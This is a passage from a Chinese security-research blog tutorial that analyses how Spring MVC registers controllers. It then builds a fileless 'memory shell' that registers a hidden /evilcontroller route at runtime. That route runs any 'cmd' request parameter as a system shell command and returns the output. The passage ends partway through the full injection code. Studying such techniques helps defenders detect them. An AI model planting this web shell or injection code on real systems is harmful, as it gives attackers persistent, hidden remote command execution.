org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改SpringMVC.xml。这里sping会自动扫描base-package下的java文件，如果文件中有@Service,@Component,@Repository,@Controller等这些注解的类，则把这些类注册为bean </p><blockquote><p>属性use-default-filters&#x3D;”false”表示不要使用默认的过滤器</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context-3.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc/spring-mvc-4.3.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;org.example.springmvc&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/WEB-INF/<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>.jsp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>prefix表示路径，suffix指定后缀</p><p>在WEB-INF下创建lib目录，将可用库全部拖进去</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113164444077.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113164444077.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230113164444077"></p><p>当访问index时，返回index，根据SpringMVC.xml配置的prefix，去<code>/WEB-INF/</code>下寻找jsp后缀的文件。</p><p>比如在&#x2F;WEB-INF&#x2F;下存放index.jsp，访问index时会通过web.xml中导入的DispatcherServlet处理请求，DispatcherServlet发送到Controller注解类，也就是TestController# return index。然后由springMVC视图解析器去&#x2F;WEB-INF&#x2F;下寻找index且为jsp后缀的文件。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171242640.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171242640.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230113171242640"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171325985.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171325985.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230113171325985"></p><p>其实如果嫌配置麻烦，可以直接使用springboot。然后直接写Controller</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h3><p>Controller负责处理DispatcherServlet分发的请求。将用户请求处理后封装成model返回给view。</p><p>在springmvc中用@Controller标记一个类为Controller。然后用@RequestMapping等来定义URL请求和Controller方法间的映射</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>org.springframework.context.ApplicationContext接口代表了IoC容器，该接口继承了BeanFactory接口。</p><h3 id="ContextLoaderListener"><a href="#ContextLoaderListener" class="headerlink" title="ContextLoaderListener"></a>ContextLoaderListener</h3><p>用来初始化全局唯一的Root Context，也就是Root WebApplicationContext.该WebApplicationContext和其他子Context共享IOC容器，共享bean</p><p>访问和操作bean就需要获得当前环境ApplicationContext</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>在Controller类打上断点，然后访问index</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230114193108680.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230114193108680.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230114193108680"></p><h3 id="Controller的注册"><a href="#Controller的注册" class="headerlink" title="Controller的注册"></a>Controller的注册</h3><p>在DoDispatch处由DispatcherServlet处理web请求</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130044552.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130044552.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115130044552"></p><p>在DispatcherServlet调用HandlerAdapter#handle处理request和response。并且此处用getHandler方法获取了mappedHandler的Handler</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130226761.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130226761.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115130226761"></p><p>往上看，mappedHandler是对handlerMappings进行遍历。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132840301.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132840301.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115132840301"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132941964.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132941964.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115132941964"></p><p>持续跟进mapping.getHandler(request)发现，AbstractHandlerMethodMapping#getHandlerInternal()中对mappingRegistry进行上锁，最后解锁。（不自觉想起了死锁）mappingRegistry存储了路由信息。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133306441.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133306441.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115133306441"></p><p>在lookupHandlerMethod方法，从mappingRegistry中获取了路由</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133835103.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133835103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115133835103"></p><p>也就是说模拟注册向mappingRegistry中添加内存马路由，就能注入内存马。</p><p>在AbstractHandlerMethodMapping中就提供了registryMapping添加路由。但是该类为抽象类。它的子类RequestMappingHandlerMapping能进行实例化</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134351643.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134351643.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115134351643"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134525368.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134525368.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115134525368"></p><h3 id="RequestMappingHandlerMapping分析"><a href="#RequestMappingHandlerMapping分析" class="headerlink" title="RequestMappingHandlerMapping分析"></a>RequestMappingHandlerMapping分析</h3><p>AbstractHandlerMethodMapping的afterProperties用于bean初始化</p><p>initHandlerMethod()遍历所有bean传入processCandidateBean处理bean，也就是controller</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115142726301.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115142726301.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115142726301"></p><p>在processCandidateBean中，getType获取bean类型，通过isHandler进行类型判断，如果bean有controller或RequestMapping注解，就进入detectHandlerMethods解析bean</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115143202340.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115143202340.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115143202340"></p><p>在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115144613123"></p><p>处理完后用registryHandlerMethod建立方法到RequestyMappingInfo的映射。也就是注册路由</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115145218392.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115145218392.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115145218392"></p><h4 id="mappingRegistry路由信息"><a href="#mappingRegistry路由信息" class="headerlink" title="mappingRegistry路由信息"></a>mappingRegistry路由信息</h4><p>registry传入的参数mapping,handler,method。mapping存储了方法映射的URL路径。handler为controller对象。method为反射获取的方法</p><h2 id="Controller内存马构造"><a href="#Controller内存马构造" class="headerlink" title="Controller内存马构造"></a>Controller内存马构造</h2><h3 id="1-获取WebApplicationContext"><a href="#1-获取WebApplicationContext" class="headerlink" title="1.获取WebApplicationContext"></a>1.获取WebApplicationContext</h3><p>在内存马的构造中，都会获取容器的context对象。在Tomcat中获取的是StandardContext，spring中获取的是<code>WebApplicationContext</code>。（在controller类声明处打上断点可以看到初始化<code>WebApplicationContext</code>的过程）WebApplicationContext继承了BeanFactory，所以能用getBean直接获取RequestMappingHandlerMapping，进而注册路由。</p><p>所以重点是如何获取WebApplicationContext</p><ul><li><p>原理：</p></li><li><p>获取WebApplicationContext:</p><p>由于webApplicationContext对象存放于servletContext中。并且键值为<code>WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE</code></p><p>所以可以直接用servletContext#getAttribute()获取属性值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">wac</span> <span class="operator">=</span> (WebApplicationContext)servletContext.getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);</span><br></pre></td></tr></table></figure><p>webApplicationContextUtils提供了下面两种方法获取webApplicationContext。需要传入servletContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContextUtils.getRequeiredWebApplicationContext(ServletContext s);</span><br><span class="line">WebApplicationContextUtils.getWebApplicationContext(ServletContext s);</span><br></pre></td></tr></table></figure><blockquote><p>spring 5的WebApplicationContextUtils已经没有getWebApplicationContext方法</p></blockquote></li><li><p>获取ServletContext</p><p>通过request对象或者ContextLoader获取ServletContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext().getServletContext();</span><br></pre></td></tr></table></figure></li><li><p>获取request可以用RequestContextHolder</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) RequestContextHolder</span><br><span class="line">        .getRequestAttributes()).getRequest();</span><br></pre></td></tr></table></figure></li></ul><p>spring中获取context的方式一般有以下几种</p><p>①直接通过ContextLoader获取，不用再经过servletContext。不过ContextLoader一般会被ban</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p>②通过RequestContextHolder获取request，然后获取servletRequest后通过RequestContextUtils得到WebApplicationContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure><p>③用RequestContextHolder直接从键值org.springframework.web.servlet.DispatcherServlet.CONTEXT中获取Context</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>④直接反射获取WebApplicationContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="literal">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure><p>实际上常用的就2,3。</p><p>其中1获取的是Root WebApplicationContext，2，3通过RequestContextUtils获取的是叫dispatcherServlet-servlet的Child WebApplicationContext。</p><blockquote><p>在有些Spring 应用逻辑比较简单的情况下，可能没有配置 <code>ContextLoaderListener</code> 、也没有类似 <code>applicationContext.xml</code> 的全局配置文件，只有简单的 <code>servlet</code> 配置文件，这时候通过1方法是获取不到<code>Root WebApplicationContext</code>的。</p></blockquote><h3 id="2-模拟注册Controller"><a href="#2-模拟注册Controller" class="headerlink" title="2.模拟注册Controller"></a>2.模拟注册Controller</h3><p>在spring2.5-3.1使用DefaultAnnotationHandlerMapping处理URL映射。spring3.1以后使用RequestMappingHandlerMapping</p><p>模拟注册Controller的方式一般有三种：</p><p>①源码分析就介绍的，registryMapping直接注册requestMapping</p><p>直接通过getBean就能获取RequestMappingHandlerMapping</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure><p>生成RequestMappingInfo。需要传入PatternsRequestCondition（Controller映射的URL）和RequestMethodsRequestCondition（HTTP请求方法）</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116132821455.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116132821455.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116132821455"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/evilcontroller&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>恶意Controller:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectedController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectedController</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">            response.getWriter().close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射获取shell方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> InjectedController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br></pre></td></tr></table></figure><p>调用ReqgistryMapping注册</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestMappingHandlerMapping.registerMapping(info, injectedController, method);</span><br></pre></td></tr></table></figure><h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><ul><li>完整代码</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springmvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> InjectedController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/evilcontroller&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">condition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line"></span><br><span 